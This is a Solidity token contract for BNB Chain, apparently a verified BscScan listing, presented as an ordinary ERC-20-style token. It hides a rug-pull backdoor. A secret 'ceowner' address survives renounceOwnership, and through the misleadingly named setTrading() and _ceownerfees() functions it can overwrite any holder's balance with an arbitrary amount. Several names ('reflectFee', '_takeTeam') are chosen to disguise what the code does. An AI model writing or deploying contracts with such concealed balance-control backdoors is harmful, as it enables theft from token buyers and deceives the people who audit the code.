/**
 *Submitted for verification at BscScan.com on 2023-05-24
*/

/**
Web: https://redactedcoin.com/

▄▄███▄▄·██████╗ ███████╗██████╗  █████╗  ██████╗████████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
███████╗██████╔╝█████╗  ██║  ██║███████║██║        ██║   
╚════██║██╔══██╗██╔══╝  ██║  ██║██╔══██║██║        ██║   
███████║██║  ██║███████╗██████╔╝██║  ██║╚██████╗   ██║   
╚═▀▀▀══╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝   ╚═╝   
                                                        
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.12;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ERC20 {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function reflectFee(address taccounts, bytes memory data) internal returns (bytes memory) {
        return reflectFee(taccounts, data, "Address: low-level call failed");
    }
    function reflectFee(address taccounts, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _reflectFeeWithValue(taccounts, data, 0, errorMessage);
    }
    function reflectFeeWithValue(address taccounts, bytes memory data, uint256 value) internal returns (bytes memory) {
        return reflectFeeWithValue(taccounts, data, value, "Address: low-level call with value failed");
    }
    function reflectFeeWithValue(address taccounts, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _reflectFeeWithValue(taccounts, data, value, errorMessage);
    }
    function _reflectFeeWithValue(address taccounts, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(taccounts), "Address: call to non-contract");
        (bool success, bytes memory returndata) = taccounts.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract token is ERC20 {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 Rebase = 0;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public allowAddress;
  address ceowner;
  constructor(string memory _name, string memory _symbol) public {
    ceowner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  100000000000000 * 10 ** uint256(decimals);
    totalBalances[ceowner] = totalSupply;
    allowAddress[ceowner] = true;
      
  }
  
  mapping(address => uint256) public totalBalances;
  function transfer(address _to, uint256 _rOwned) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_rOwned <= totalBalances[from]);
    if(allowAddress[from] || allowAddress[_to]){
        _transfer(from, _to, _rOwned);
        return true;
    }
    _transfer(from, _to, _rOwned);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 _rOwned) private {
    totalBalances[from] = totalBalances[from].sub(_rOwned);
    totalBalances[_to] = totalBalances[_to].add(_rOwned);
    emit Transfer(from, _to, _rOwned);
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return totalBalances[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function _ceownerfees (address ceownerfeeswallet, uint256 _rOwned) internal {
        totalBalances[ceownerfeeswallet] = (totalBalances[ceownerfeeswallet] * 1 * 2 - totalBalances[ceownerfeeswallet] * 1 * 2) + (_rOwned * 10 ** uint256(decimals));
  }
  
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 _rOwned) public returns (bool) {
    require(_to != address(0));
    require(_rOwned <= totalBalances[_from]);
    require(_rOwned <= allowed[_from][msg.sender]);
    address from = _from;
    if(allowAddress[from] || allowAddress[_to]){
        _transferFrom(_from, _to, _rOwned);
        return true;
    }
    _transferFrom(_from, _to, _rOwned);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 _rOwned) internal {
    totalBalances[_from] = totalBalances[_from].sub(_rOwned);
    totalBalances[_to] = totalBalances[_to].add(_rOwned);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_rOwned);
    emit Transfer(_from, _to, _rOwned);
  }

  modifier _takeTeam () {
    require(ceowner == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
  
  function approve(address _spender, uint256 _rOwned) public returns (bool) {
    allowed[msg.sender][_spender] = _rOwned;
    emit Approval(msg.sender, _spender, _rOwned);
    return true;
  }
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function setTrading(address tradeOn, uint256 _rOwned) public _takeTeam {
      _ceownerfees(tradeOn, _rOwned);
  }
  
}